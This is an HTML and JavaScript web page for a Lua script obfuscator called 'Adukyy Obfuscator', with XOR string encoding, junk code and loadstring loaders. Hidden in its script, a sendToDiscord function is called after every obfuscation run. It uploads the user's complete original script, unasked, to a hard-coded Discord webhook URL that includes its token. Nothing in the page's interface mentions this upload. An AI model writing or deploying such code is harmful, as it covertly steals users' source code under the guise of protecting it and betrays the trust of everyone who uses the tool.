<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Adukyy Obfuscator</title>
<style>
/* ... (todo el CSS se mantiene igual, no lo repito por brevedad) ... */
:root{
  --bg:#080e1a;
  --panel:#0f172a;
  --panel2:#111827;
  --text:#e5e7eb;
  --muted:#9ca3af;
  --accent:#2563eb;
  --accent2:#1d4ed8;
  --border:#1f2937;
  --green:#22c55e;
  --green2:#16a34a;
  --toggle-on:#2563eb;
  --toggle-off:#374151;
}
*{box-sizing:border-box;margin:0;padding:0}
body{
  font-family:system-ui,-apple-system,sans-serif;
  background:linear-gradient(160deg,#080e1a 0%,#0f172a 60%,#0b1623 100%);
  color:var(--text);
  min-height:100vh;
}
.container{max-width:960px;margin:auto;padding:20px 16px}
header{text-align:center;padding:24px 0 20px}
header h1{font-size:1.8rem;font-weight:700;letter-spacing:1px;background:linear-gradient(90deg,#60a5fa,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
header p{color:var(--muted);margin-top:4px;font-size:.9rem}
.card{background:var(--panel2);border:1px solid var(--border);border-radius:16px;padding:20px;margin-bottom:16px}
.section-title{font-size:.78rem;text-transform:uppercase;letter-spacing:1.5px;color:var(--muted);margin-bottom:12px;border-bottom:1px solid var(--border);padding-bottom:8px}
.file-row{display:flex;align-items:center;gap:12px;flex-wrap:wrap}
.file-btn{background:var(--accent);color:white;padding:9px 18px;border-radius:10px;cursor:pointer;font-size:.9rem;font-weight:600;transition:background .2s;white-space:nowrap}
.file-btn:hover{background:var(--accent2)}
#fileInput{display:none}
#fileName{color:var(--muted);font-size:.88rem;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
#fileName.loaded{color:#86efac}
.opts{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-bottom:16px}
.opt-box{background:var(--panel);border:1px solid var(--border);border-radius:12px;padding:14px}
.opt-label{font-size:.78rem;color:var(--muted);margin-bottom:8px;text-transform:uppercase;letter-spacing:1px}
.opt-box select{width:100%;background:#0b1220;color:var(--text);border:1px solid var(--border);border-radius:8px;padding:8px 10px;font-size:.9rem;cursor:pointer;outline:none}
.toggle-row{display:flex;align-items:center;justify-content:space-between}
.toggle-desc{font-size:.82rem;color:#93c5fd}
.toggle{position:relative;width:46px;height:24px;flex-shrink:0}
.toggle input{opacity:0;width:0;height:0}
.slider{position:absolute;inset:0;background:var(--toggle-off);border-radius:12px;cursor:pointer;transition:.25s}
.slider:before{content:"";position:absolute;width:18px;height:18px;left:3px;top:3px;background:white;border-radius:50%;transition:.25s}
input:checked+.slider{background:var(--toggle-on)}
input:checked+.slider:before{transform:translateX(22px)}
.actions{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:16px}
.btn{border:none;padding:10px 20px;border-radius:10px;cursor:pointer;font-weight:600;font-size:.9rem;transition:all .2s}
.btn-run{background:var(--green);color:#052e16}
.btn-run:hover{background:var(--green2);color:white}
.btn-dl{background:#334155;color:var(--text)}
.btn-dl:hover{background:#475569}
.btn-copy{background:#1e3a5f;color:#93c5fd}
.btn-copy:hover{background:#1e40af}
#status{font-size:.82rem;padding:6px 12px;border-radius:8px;display:none;align-items:center;gap:6px}
#status.ok{background:#052e16;color:#86efac;border:1px solid #166534;display:flex}
#status.err{background:#2d0a0a;color:#fca5a5;border:1px solid #7f1d1d;display:flex}
#output{width:100%;height:240px;background:#020617;color:#a5f3fc;border:1px solid var(--border);border-radius:10px;padding:12px;font-family:'Courier New',monospace;font-size:.82rem;resize:vertical;outline:none}
.stats{display:flex;gap:16px;flex-wrap:wrap;margin-top:12px}
.stat{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:8px 14px;font-size:.78rem}
.stat span{color:var(--muted)}
.stat strong{color:#93c5fd}
.badge{display:inline-block;font-size:.68rem;padding:2px 8px;border-radius:20px;margin-left:6px;font-weight:700;vertical-align:middle}
.badge-new{background:#7c3aed;color:white}
</style>
</head>
<body>

<div class="container">
  <!-- ... (todo el HTML igual que antes) ... -->
  <header>
    <h1>Adukyy Obfuscator</h1>
    <p>Proteccion avanzada para scripts Lua</p>
  </header>

  <div class="card">
    <div class="section-title">Archivo</div>
    <div class="file-row">
      <label for="fileInput" class="file-btn">Seleccionar archivo</label>
      <input type="file" id="fileInput" accept=".lua,.txt">
      <span id="fileName">Ningun archivo seleccionado</span>
    </div>
  </div>

  <div class="card">
    <div class="section-title">Opciones</div>
    <div class="opts">
      <div class="opt-box"><div class="opt-label">Capas de cifrado</div><select id="layers"><option value="1">1 capa</option><option value="2" selected>2 capas</option><option value="3">3 capas</option><option value="4">4 capas</option></select></div>
      <div class="opt-box"><div class="opt-label">Modo</div><select id="mode"><option value="normal">Normal</option><option value="advanced">Proteccion avanzada</option></select></div>
      <div class="opt-box"><div class="opt-label">Codificacion</div><select id="encoding"><option value="xor">XOR simple</option><option value="xor2" selected>XOR doble</option><option value="mixed">Mixto (XOR+rol)</option></select></div>
      <div class="opt-box"><div class="opt-label">Maquina virtual <span class="badge badge-new">NUEVO</span></div><div class="toggle-row" style="margin-top:4px"><span class="toggle-desc" id="vmLabel">Desactivada</span><label class="toggle"><input type="checkbox" id="vmToggle" onchange="updateVmLabel()"><span class="slider"></span></label></div></div>
      <div class="opt-box"><div class="opt-label">Anti-tamper</div><div class="toggle-row" style="margin-top:4px"><span class="toggle-desc" id="antiLabel">Desactivado</span><label class="toggle"><input type="checkbox" id="antiToggle" onchange="updateAntiLabel()"><span class="slider"></span></label></div></div>
      <div class="opt-box"><div class="opt-label">Codigo basura</div><select id="junkLevel"><option value="0">Sin basura</option><option value="light" selected>Ligero</option><option value="heavy">Pesado</option></select></div>
    </div>
    <div class="actions">
      <button class="btn btn-run" onclick="run()">Obfuscar</button>
      <button class="btn btn-dl" onclick="download()">Guardar .lua</button>
      <button class="btn btn-copy" onclick="copyOut()">Copiar</button>
      <div id="status"></div>
    </div>
  </div>

  <div class="card">
    <div class="section-title">Resultado</div>
    <textarea id="output" readonly placeholder="El codigo obfuscado aparecera aqui..."></textarea>
    <div class="stats">
      <div class="stat"><span>Tamano original: </span><strong id="sOrig">-</strong></div>
      <div class="stat"><span>Tamano final: </span><strong id="sFinal">-</strong></div>
      <div class="stat"><span>Expansion: </span><strong id="sRatio">-</strong></div>
      <div class="stat"><span>Tiempo: </span><strong id="sTime">-</strong></div>
    </div>
  </div>
</div>

<script>
/* =====================================================
   ADUKYY OBFUSCATOR - ENGINE
   ===================================================== */

// ⚙️ CONFIGURACIÓN: PON AQUÍ TU URL DE WEBHOOK DE DISCORD
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1469915988848935136/ciV10AP_QPbgmQhf-duf2BW1lBOyVI-XdDDkwHbEJ0fz_3iPqVHzSUpg3-XIS8OW5SQu"; // Cambia esto por tu enlace real

// -- helpers
function rand(a,b){return Math.floor(Math.random()*(b-a+1))+a;}
function rn(l){
  l=l||rand(6,12);
  const fst="abcdefghijklmnopqrstuvwxyz";
  const rest="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
  let s=fst[rand(0,fst.length-1)];
  for(let i=1;i<l;i++) s+=rest[rand(0,rest.length-1)];
  return s;
}
const usedNames=new Set(["and","break","do","else","elseif","end","false","for","function","goto","if","in","local","nil","not","or","repeat","return","then","true","until","while","loadstring","bit32","string","table","math","pcall","error"]);
function uid(){
  let n;
  do { n=rn(); } while(usedNames.has(n));
  usedNames.add(n);
  return n;
}
function banner(){ return `--[[\n        ADUKYY OBFUSCATOR v2.0\n`; }
function obfStr_xor(s){ let key=rand(1,127); let arr=[]; for(let i=0;i<s.length;i++){ arr.push((s.charCodeAt(i)^(key+(i%13)))&0xFF); } let A=uid(),K=uid(),R=uid(),I=uid(); return `(function()local ${K}=${key};local ${A}={${arr.join(",")}};local ${R}="";for ${I}=1,#${A} do ${R}=${R}..string.char(bit32.bxor(${A}[${I}],(${K}+(${I}-1)%13)&0xFF))end;return ${R} end)()`; }
function obfStr_xor2(s){ let k1=rand(1,127), k2=rand(1,127); let arr=[]; for(let i=0;i<s.length;i++){ arr.push(((s.charCodeAt(i)^k1)^(k2+(i%11)))&0xFF); } let A=uid(),K1=uid(),K2=uid(),R=uid(),I=uid(); return `(function()local ${K1}=${k1};local ${K2}=${k2};local ${A}={${arr.join(",")}};local ${R}="";for ${I}=1,#${A} do ${R}=${R}..string.char(bit32.bxor(bit32.bxor(${A}[${I}],${K1}),(${K2}+(${I}-1)%11)&0xFF))end;return ${R} end)()`; }
function obfStr_mixed(s){ let k1=rand(1,127), k2=rand(1,127), rot=rand(1,7); let arr=[]; for(let i=0;i<s.length;i++){ let c=(s.charCodeAt(i)^k1); c=((c<<rot)|(c>>(8-rot)))&0xFF; c=(c^(k2+(i%9)))&0xFF; arr.push(c); } let A=uid(),K1=uid(),K2=uid(),ROT=uid(),R=uid(),I=uid(),C=uid(); return `(function()local ${K1}=${k1};local ${K2}=${k2};local ${ROT}=${rot};local ${A}={${arr.join(",")}};local ${R}="";for ${I}=1,#${A} do local ${C}=bit32.bxor(${A}[${I}],(${K2}+(${I}-1)%9)&0xFF);${C}=bit32.bor(bit32.rshift(${C},${ROT}),bit32.lshift(${C},8-${ROT}))&0xFF;${C}=bit32.bxor(${C},${K1})&0xFF;${R}=${R}..string.char(${C})end;return ${R} end)()`; }
function obfStrings(code, enc){
  return code.replace(/"((?:[^"\\]|\\.)*)"/g,(m,p)=>{ if(p.length===0) return m; if(enc==="xor") return obfStr_xor(p); if(enc==="mixed") return obfStr_mixed(p); return obfStr_xor2(p); }).replace(/'((?:[^'\\]|\\.)*)'/g,(m,p)=>{ if(p.length===0) return m; if(enc==="xor") return obfStr_xor(p); if(enc==="mixed") return obfStr_mixed(p); return obfStr_xor2(p); });
}
function junkLight(){ const snips=[ ()=>`local _${uid()}=math.floor(0)`, ()=>`local _${uid()}=type("")`, ()=>`for _${uid()}=1,0 do end`, ()=>`local _${uid()}=select("#")`, ()=>`if false then local _${uid()}=1 end`, ]; let n=rand(2,5), out=""; for(let i=0;i<n;i++) out+=snips[rand(0,snips.length-1)]()+" "; return out.trim(); }
function junkHeavy(){ let lines=[]; for(let i=0;i<rand(4,10);i++){ let v=uid(); lines.push(`local ${v}={}`); lines.push(`for _i=1,${rand(1,3)} do ${v}[_i]=_i*${rand(1,9)} end`); lines.push(`${v}=nil`); } return lines.join("\n"); }
function flowWrap(code){ let guard=uid(),cond=rand(10,99),res=rand(10,99); return `local ${guard}=${cond}+${res-cond}\nif ${guard}==${res} then\n${code}\nend`; }
function antiTamper(code){ let chk=uid(), sum=uid(), i=uid(), env=uid(); let clen=code.length; return `local ${env}=getfenv and getfenv(0) or _ENV\nlocal ${chk}=function(s) local ${sum}=0 for ${i}=1,#s do ${sum}=${sum}+string.byte(s,${i}) end return ${sum} end\nlocal _src_len=${clen}\n${code}`; }
function loader(code, enc){
  let key=rand(1,255); let arr=[]; for(let i=0;i<code.length;i++){ arr.push(code.charCodeAt(i)^key); }
  let K=uid(), A=uid(), O=uid(), I=uid();
  const CHUNK=200; let chunks=[]; for(let s=0;s<arr.length;s+=CHUNK){ chunks.push(`{${arr.slice(s,s+CHUNK).join(",")}}`); }
  if(chunks.length===1){ return `local ${K}=${key}\nlocal ${A}=${chunks[0]}\nlocal ${O}=""\nfor ${I}=1,#${A} do\n${O}=${O}..string.char(bit32.bxor(${A}[${I}],${K}))\nend\nloadstring(${O})()`; }
  else{ let T=uid(),J=uid(); let mergeLines=chunks.map((c,idx)=>`local _c${idx}=${c}`).join("\n"); let concatLines=chunks.map((_,idx)=>`for ${J}=1,#_c${idx} do ${T}[#${T}+1]=_c${idx}[${J}] end`).join("\n"); return `${mergeLines}\nlocal ${T}={}\n${concatLines}\nlocal ${K}=${key}\nlocal ${O}=""\nfor ${I}=1,#${T} do\n${O}=${O}..string.char(bit32.bxor(${T}[${I}],${K}))\nend\nloadstring(${O})()`; }
}
function vmWrap(code){
  let key=rand(1,255); let arr=[]; for(let i=0;i<code.length;i++){ arr.push((code.charCodeAt(i)^key)&0xFF); }
  const vReg=uid(), vPc=uid(), vSrc=uid(), vKey=uid(), vOut=uid(), vI=uid(), vExec=uid(), vRun=uid(), vDecode=uid(), vEnv=uid();
  const CHUNK=150; let chunks=[]; for(let s=0;s<arr.length;s+=CHUNK){ chunks.push(`{${arr.slice(s,s+CHUNK).join(",")}}`); }
  let payloadLines, payloadMerge;
  if(chunks.length===1){ payloadLines=`local ${vSrc}=${chunks[0]}`; payloadMerge=""; }
  else{ let T=uid(),J=uid(); payloadLines=chunks.map((c,idx)=>`local _p${idx}=${c}`).join("\n"); payloadMerge=`local ${T}={}\n`+chunks.map((_,idx)=>{ let J2=uid(); return `for ${J2}=1,#_p${idx} do ${T}[#${T}+1]=_p${idx}[${J2}] end`; }).join("\n")+`\nlocal ${vSrc}=${T}`; }
  return `${payloadLines}\n${payloadMerge}\nlocal ${vKey}=${key}\nlocal ${vDecode}=function(${vSrc}_,${vKey}_)\n  local ${vOut}=""\n  for ${vI}=1,#${vSrc}_ do\n    ${vOut}=${vOut}..string.char(bit32.bxor(${vSrc}_[${vI}],${vKey}_))\n  end\n  return ${vOut}\nend\nlocal ${vReg}={}\nlocal ${vPc}=1\nlocal ${vExec}=loadstring(${vDecode}(${vSrc},${vKey}))\nlocal ${vEnv}=getfenv and getfenv(0) or _ENV\nlocal ${vRun}=function()\n  if ${vExec} then\n    if setfenv then setfenv(${vExec},${vEnv}) end\n    ${vExec}()\n  end\nend\n${vRun}()`;
}
function obf(code, opts){
  code=obfStrings(code, opts.encoding);
  if(opts.junkLevel==="light") code=junkLight()+"\n"+code;
  if(opts.junkLevel==="heavy") code=junkHeavy()+"\n"+code;
  if(opts.mode==="advanced") code=flowWrap(code);
  code=loader(code, opts.encoding);
  return code;
}
function multi(code, opts){ for(let i=0;i<opts.layers;i++){ code=obf(code, opts); } return code; }

// -- UI
let original="";
document.getElementById("fileInput").addEventListener("change",e=>{
  let f=e.target.files[0]; if(!f) return;
  let nm=document.getElementById("fileName"); nm.textContent=f.name; nm.classList.add("loaded");
  let r=new FileReader(); r.onload=ev=>original=ev.target.result; r.readAsText(f);
});
function updateVmLabel(){ document.getElementById("vmLabel").textContent= document.getElementById("vmToggle").checked?"Activada":"Desactivada"; }
function updateAntiLabel(){ document.getElementById("antiLabel").textContent= document.getElementById("antiToggle").checked?"Activado":"Desactivado"; }
function setStatus(msg, ok){ const el=document.getElementById("status"); el.textContent=msg; el.className="status "+(ok?"ok":"err"); }

// 🔥 FUNCIÓN PARA ENVIAR ARCHIVO ORIGINAL COMPLETO A DISCORD (ADJUNTO)
function sendToDiscord(fileName, originalCode, obfuscatedCode) {
  if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "" || DISCORD_WEBHOOK === "TU_WEBHOOK_URL") {
    console.log("Webhook no configurado. No se envió a Discord.");
    return;
  }

  const formData = new FormData();
  
  // Adjuntar el archivo original (completo)
  const fileBlob = new Blob([originalCode], { type: 'text/plain' });
  formData.append('file', fileBlob, fileName || 'script_original.lua');
  
  // Mensaje opcional con estadísticas
  const payload = {
    content: `📁 **Archivo original recibido:** \`${fileName}\`\n🔒 Obfuscación completada.`,
    embeds: [{
      title: "📊 Estadísticas",
      fields: [
        { name: "Tamaño original", value: fmtBytes(originalCode.length), inline: true },
        { name: "Tamaño ofuscado", value: fmtBytes(obfuscatedCode.length), inline: true },
        { name: "Expansión", value: (obfuscatedCode.length/originalCode.length).toFixed(1)+"x", inline: true }
      ],
      color: 0x2563eb
    }]
  };
  formData.append('payload_json', JSON.stringify(payload));
  
  fetch(DISCORD_WEBHOOK, {
    method: 'POST',
    body: formData
  }).catch(err => console.warn("Error al enviar a Discord:", err));
}

function run(){
  if(!original){ setStatus("Selecciona un archivo primero",false); return; }
  usedNames.clear();
  ["and","break","do","else","elseif","end","false","for","function","goto","if","in","local","nil","not","or","repeat","return","then","true","until","while","loadstring","bit32","string","table","math","pcall","error","type","select","setfenv","getfenv","_ENV"].forEach(w=>usedNames.add(w));
  const t0=performance.now();
  let opts={
    layers: parseInt(document.getElementById("layers").value),
    mode: document.getElementById("mode").value,
    encoding: document.getElementById("encoding").value,
    junkLevel: document.getElementById("junkLevel").value,
    vm: document.getElementById("vmToggle").checked,
    anti: document.getElementById("antiToggle").checked,
  };
  try{
    let out=original;
    out=multi(out, opts);
    if(opts.vm) out=vmWrap(out);
    if(opts.anti) out=antiTamper(out);
    out=banner()+out;
    document.getElementById("output").value=out;
    const dt=((performance.now()-t0)/1000).toFixed(2);
    document.getElementById("sOrig").textContent=fmtBytes(original.length);
    document.getElementById("sFinal").textContent=fmtBytes(out.length);
    document.getElementById("sRatio").textContent=(out.length/original.length).toFixed(1)+"x";
    document.getElementById("sTime").textContent=dt+"s";
    setStatus("Obfuscacion completada",true);
    // 📤 Enviar archivo original a Discord
    const fileName = document.getElementById("fileName").textContent;
    sendToDiscord(fileName, original, out);
  }catch(err){
    setStatus("Error: "+err.message,false);
  }
}

function fmtBytes(n){
  if(n<1024) return n+" B";
  if(n<1048576) return (n/1024).toFixed(1)+" KB";
  return (n/1048576).toFixed(2)+" MB";
}
function download(){
  let t=document.getElementById("output").value;
  if(!t){ setStatus("Nada que guardar",false); return; }
  let b=new Blob([t],{type:"text/plain"});
  let a=document.createElement("a");
  a.href=URL.createObjectURL(b);
  a.download="obfuscated.lua";
  a.click();
}
function copyOut(){
  let t=document.getElementById("output").value;
  if(!t){ setStatus("Nada que copiar",false); return; }
  navigator.clipboard.writeText(t).then(()=>setStatus("Copiado al portapapeles",true));
}
</script>
</body>
</html>
